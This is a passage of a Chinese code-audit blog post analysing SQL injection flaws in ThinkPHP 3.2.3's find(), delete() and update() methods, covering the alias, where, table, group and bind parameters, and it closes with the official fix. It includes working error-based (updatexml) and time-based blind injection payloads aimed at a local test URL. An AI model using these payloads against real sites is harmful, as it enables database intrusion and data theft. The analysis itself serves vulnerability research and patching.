class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因而SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<h5 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h5><blockquote>
+<p>传入第二个payload</p>
+<p>?id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)–</p>
+</blockquote>
+<p><strong>alias</strong>指别名，即SQL语句中表的别名</p>
+<p>主要漏洞在于<code>_parseOptions()</code>方法中 ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		......</span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options[<span class="string">'alias'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'table'</span>] .= <span class="string">' '</span> . $options[<span class="string">'alias'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">		......</span><br><span class="line">        <span class="keyword">return</span> $options;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接将别名拼凑在表名的后面，从而导致了注入</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/1.png" width="550">
+
+<p>最终注入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<h5 id="where"><a href="#where" class="headerlink" title="where"></a>where</h5><p>同上，进入到<code>find()</code>方法内</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ......</span><br><span class="line">   $resultSet = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进到<code>select()</code>方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>buildSelectSql()</code>方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>parseSql()</code>中拼接时将$option[‘where’]作为了where部分，拼接后导致注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终注入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h4><p>根据上面的漏洞复现发现，上面漏洞都有一个共同点：涉及<code>parseSql()</code>方法且$option可控，那么其他字段是否也存在注入呢？</p>
+<p>答案是肯定的……</p>
+<h5 id="group"><a href="#group" class="headerlink" title="group"></a>group</h5><p><strong>payload</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">group</span>]=id and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">group</span>]=id and (select case when (ascii(mid(database() from 1 for 1))=116) then sleep(0.5) else 0 end)</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/3.png" width="600">
+
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/2.png" width>
+
+<p>获取$options[‘’group]中的值是<code>parseGroup()</code>完成的，因$options可控，且没有任何过滤，因此导致注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseGroup</span><span class="params">($group)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($group) ? <span class="string">' GROUP BY '</span> . $group : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>理论上其他字段都存在相应的漏洞风险。</p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h3><h4 id="审计复现-1"><a href="#审计复现-1" class="headerlink" title="审计复现"></a>审计复现</h4><p>控制器：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//实例化数据模型</span></span><br><span class="line">        $model=M(<span class="string">'user'</span>);</span><br><span class="line">        <span class="comment">//接收数据</span></span><br><span class="line">        $id=I(<span class="string">'id'</span>);</span><br><span class="line">        $res=$model-&gt;delete($id);</span><br><span class="line">        <span class="comment">//输出结果</span></span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在传入payload复现之前，这里先输入一些正常数据看看SQL语句表现形式</p>
+<ol>
+<li>传入?id=1时，SQL:</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+
+<p>关键代码：自动添加单引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseValue</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string($value)) &#123;</span><br><span class="line">            $value = strpos($value, <span class="string">':'</span>) === <span class="number">0</span> &amp;&amp; in_array($value, array_keys(<span class="keyword">$this</span>-&gt;bind)) ? <span class="keyword">$this</span>-&gt;escapeString($value) : <span class="string">'\''</span> . <span class="keyword">$this</span>-&gt;escapeString($value) . <span class="string">'\''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>传入?id=1,2时，SQL：自动添加 IN、括号和单引号</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> <span class="keyword">IN</span> (<span class="string">'1'</span>,<span class="string">'2'</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/5.png" width="600">
+
+<p>在这种情况下显然是无法进行注入的</p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table：</span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">table</span>]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span><br><span class="line"></span><br><span class="line">where: </span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">where</span>]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure>
+
+<h5 id="where-1"><a href="#where-1" class="headerlink" title="where"></a>where</h5><p>输入payload后跟进到<code>delete()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pk = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options[<span class="string">'where'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;delete($options);</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先进入到<code>_parseOptions($optinos)</code></p>
+<blockquote>
+<p>该函数非常重要，在本例中没有起到作用，顺利通过</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		......</span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options[<span class="string">'alias'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'table'</span>] .= <span class="string">' '</span> . $options[<span class="string">'alias'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">        $options[<span class="string">'model'</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="comment">// 字段类型验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'where'</span>]) &amp;&amp; is_array($options[<span class="string">'where'</span>]) &amp;&amp; !<span class="keyword">empty</span>($fields) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'join'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">            <span class="keyword">foreach</span> ($options[<span class="string">'where'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                $key = trim($key);</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_scalar($val)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;_parseType($options[<span class="string">'where'</span>], $key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 表达式过滤</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_options_filter($options);</span><br><span class="line">        <span class="keyword">return</span> $options;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到<code>delete()</code>函数中，进入<code>$result = $this-&gt;db-&gt;delete($options);</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">       ......</span><br><span class="line">       $table = <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]);</span><br><span class="line">       $sql   = <span class="string">'DELETE FROM '</span> . $table;</span><br><span class="line">       ......</span><br><span class="line">       $sql .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>);</span><br><span class="line">       <span class="keyword">if</span> (!strpos($table, <span class="string">','</span>)) &#123;</span><br><span class="line">           <span class="comment">// 单表删除支持order和limit</span></span><br><span class="line">       ......</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>parseWhere</code>()中，$where为字符串，直接赋值给$whereStr</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $whereStr = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_string($where)) &#123;</span><br><span class="line">            <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">            $whereStr = $where;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>($whereStr) ? <span class="string">''</span> : <span class="string">' WHERE '</span> . $whereStr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/6.png" width>
+
+<p>拼接到SQL语句中</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/7.png" width>
+
+<p>注入成功</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/8.png" width>
+
+<h5 id="table-1"><a href="#table-1" class="headerlink" title="table"></a>table</h5><blockquote>
+<p><strong>payload：</strong></p>
+<p><a href="http://127.0.0.1/tp3_2/Home/Index/sql?id[table]=user" target="_blank" rel="noopener">http://127.0.0.1/tp3_2/Home/Index/sql?id[table]=user</a> where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)–&amp;id[where]=1</p>
+</blockquote>
+<p>进入到<code>$this-&gt;db-&gt;delete($options);</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        $table = <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]);</span><br><span class="line">        $sql   = <span class="string">'DELETE FROM '</span> . $table;</span><br><span class="line">        ......</span><br><span class="line">        $sql .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进到<code>parseTable($options[&#39;table&#39;])</code>，显然传入参数为字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span><span class="params">($tables)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tables)) &#123;</span><br><span class="line">            ......</span><br><span class="line">            $tables = $array;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($tables)) &#123;</span><br><span class="line">            $tables = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'parseKey'</span>), explode(<span class="string">','</span>, $tables));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">','</span>, $tables);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在本方法中会先对传入参数值进行分割，再合并成数组，这里不会对payload造成影响</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/9.png" width="700">
+
+<p>回到<code>delete()</code>方法中，成功拼接成注入语句</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/10.png" width="700">
+
+<p>这里的payload中必须传入id[where]，原因在于<code>delete()</code>方法中，若无where字段值，直接返回false</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/11.png" width="500">
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>根据官方的修复来看，主要是在各个方法中不再使用$options，改用$this-&gt;options，且不再使用<code>_parseOptions($options)</code>，因此$options不再可控，漏洞被修复。</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/4.png" width>
+
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
+<p>写上面部分时没有遇到以下漏洞，因而在下面更新补充，便于今后查阅</p>
+</blockquote>
+<h3 id="parseWhereItem-造成的注入"><a href="#parseWhereItem-造成的注入" class="headerlink" title="parseWhereItem()造成的注入"></a>parseWhereItem()造成的注入</h3><blockquote>
+<p>原本认为tp3中数据查询相关操作如果使用数组为参数会非常安全，但发现以下类型的漏洞</p>
+</blockquote>
+<h4 id="update-注入"><a href="#update-注入" class="headerlink" title="update()注入"></a>update()注入</h4><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"member1"</span>);</span><br><span class="line">    $user=<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;I(<span class="string">'id'</span>));</span><br><span class="line">    $data[<span class="string">'money'</span>] = I(<span class="string">'money'</span>);</span><br><span class="line">    $data[<span class="string">'user'</span>] = I(<span class="string">'user'</span>);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="section">money</span>[]=<span class="number">1123</span>&amp;user=liao&amp;id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span> and (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>传入payload后，首先进入到<code>Include/Library/Think/Model.class.php</code>中<code>where()</code>方法中，在where方法中确定SQL语句中where条件部分的键数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($where, $parse = null)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!is_null($parse) &amp;&amp; is_string($where)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!is_array($parse)) &#123;</span><br><span class="line">				$parse = func_get_args();</span><br><span class="line">				array_shift($parse);</span><br><span class="line">			&#125;</span><br><span class="line">			